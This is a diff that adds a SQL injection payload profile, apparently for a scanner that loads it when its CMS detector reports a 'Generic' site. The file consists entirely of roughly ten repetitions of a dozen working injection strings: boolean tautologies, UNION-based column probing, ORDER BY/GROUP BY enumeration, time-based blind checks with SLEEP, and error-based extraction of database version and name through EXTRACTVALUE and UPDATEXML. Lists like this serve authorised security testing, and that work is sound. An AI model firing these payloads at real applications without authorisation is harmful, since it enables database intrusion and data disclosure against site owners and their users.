@@ -1,0 +1,122 @@
+# generic CMS-specific SQL injection payload profile
+# Loaded automatically when CMS detector identifies Generic
+' OR '1'='1' /*generic_1*/
+' AND 1=2 UNION SELECT NULL-- generic_2
+' AND SLEEP(4)-- generic_3
+' OR IF(4=4,SLEEP(2),0)-- generic_4
+' UNION SELECT NULL,NULL,NULL-- generic_5
+' ORDER BY 7-- generic_6
+' GROUP BY 8 HAVING 1=1-- generic_7
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- generic_8
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- generic_9
+1 OR 1=1# generic_10
+-1 UNION SELECT NULL-- generic_11
+' OR 1=1-- generic_12
+' OR '1'='1' /*generic_13*/
+' AND 1=2 UNION SELECT NULL-- generic_14
+' AND SLEEP(1)-- generic_15
+' OR IF(16=16,SLEEP(2),0)-- generic_16
+' UNION SELECT NULL,NULL,NULL-- generic_17
+' ORDER BY 9-- generic_18
+' GROUP BY 4 HAVING 1=1-- generic_19
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- generic_20
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- generic_21
+1 OR 1=1# generic_22
+-1 UNION SELECT NULL-- generic_23
+' OR 1=1-- generic_24
+' OR '1'='1' /*generic_25*/
+' AND 1=2 UNION SELECT NULL-- generic_26
+' AND SLEEP(3)-- generic_27
+' OR IF(28=28,SLEEP(2),0)-- generic_28
+' UNION SELECT NULL,NULL,NULL-- generic_29
+' ORDER BY 1-- generic_30
+' GROUP BY 8 HAVING 1=1-- generic_31
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- generic_32
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- generic_33
+1 OR 1=1# generic_34
+-1 UNION SELECT NULL-- generic_35
+' OR 1=1-- generic_36
+' OR '1'='1' /*generic_37*/
+' AND 1=2 UNION SELECT NULL-- generic_38
+' AND SLEEP(5)-- generic_39
+' OR IF(40=40,SLEEP(2),0)-- generic_40
+' UNION SELECT NULL,NULL,NULL-- generic_41
+' ORDER BY 3-- generic_42
+' GROUP BY 4 HAVING 1=1-- generic_43
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- generic_44
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- generic_45
+1 OR 1=1# generic_46
+-1 UNION SELECT NULL-- generic_47
+' OR 1=1-- generic_48
+' OR '1'='1' /*generic_49*/
+' AND 1=2 UNION SELECT NULL-- generic_50
+' AND SLEEP(2)-- generic_51
+' OR IF(52=52,SLEEP(2),0)-- generic_52
+' UNION SELECT NULL,NULL,NULL-- generic_53
+' ORDER BY 5-- generic_54
+' GROUP BY 8 HAVING 1=1-- generic_55
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- generic_56
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- generic_57
+1 OR 1=1# generic_58
+-1 UNION SELECT NULL-- generic_59
+' OR 1=1-- generic_60
+' OR '1'='1' /*generic_61*/
+' AND 1=2 UNION SELECT NULL-- generic_62
+' AND SLEEP(4)-- generic_63
+' OR IF(64=64,SLEEP(2),0)-- generic_64
+' UNION SELECT NULL,NULL,NULL-- generic_65
+' ORDER BY 7-- generic_66
+' GROUP BY 4 HAVING 1=1-- generic_67
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- generic_68
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- generic_69
+1 OR 1=1# generic_70
+-1 UNION SELECT NULL-- generic_71
+' OR 1=1-- generic_72
+' OR '1'='1' /*generic_73*/
+' AND 1=2 UNION SELECT NULL-- generic_74
+' AND SLEEP(1)-- generic_75
+' OR IF(76=76,SLEEP(2),0)-- generic_76
+' UNION SELECT NULL,NULL,NULL-- generic_77
+' ORDER BY 9-- generic_78
+' GROUP BY 8 HAVING 1=1-- generic_79
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- generic_80
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- generic_81
+1 OR 1=1# generic_82
+-1 UNION SELECT NULL-- generic_83
+' OR 1=1-- generic_84
+' OR '1'='1' /*generic_85*/
+' AND 1=2 UNION SELECT NULL-- generic_86
+' AND SLEEP(3)-- generic_87
+' OR IF(88=88,SLEEP(2),0)-- generic_88
+' UNION SELECT NULL,NULL,NULL-- generic_89
+' ORDER BY 1-- generic_90
+' GROUP BY 4 HAVING 1=1-- generic_91
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- generic_92
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- generic_93
+1 OR 1=1# generic_94
+-1 UNION SELECT NULL-- generic_95
+' OR 1=1-- generic_96
+' OR '1'='1' /*generic_97*/
+' AND 1=2 UNION SELECT NULL-- generic_98
+' AND SLEEP(5)-- generic_99
+' OR IF(100=100,SLEEP(2),0)-- generic_100
+' UNION SELECT NULL,NULL,NULL-- generic_101
+' ORDER BY 3-- generic_102
+' GROUP BY 8 HAVING 1=1-- generic_103
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- generic_104
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- generic_105
+1 OR 1=1# generic_106
+-1 UNION SELECT NULL-- generic_107
+' OR 1=1-- generic_108
+' OR '1'='1' /*generic_109*/
+' AND 1=2 UNION SELECT NULL-- generic_110
+' AND SLEEP(2)-- generic_111
+' OR IF(112=112,SLEEP(2),0)-- generic_112
+' UNION SELECT NULL,NULL,NULL-- generic_113
+' ORDER BY 5-- generic_114
+' GROUP BY 4 HAVING 1=1-- generic_115
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- generic_116
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- generic_117
+1 OR 1=1# generic_118
+-1 UNION SELECT NULL-- generic_119
+' OR 1=1-- generic_120
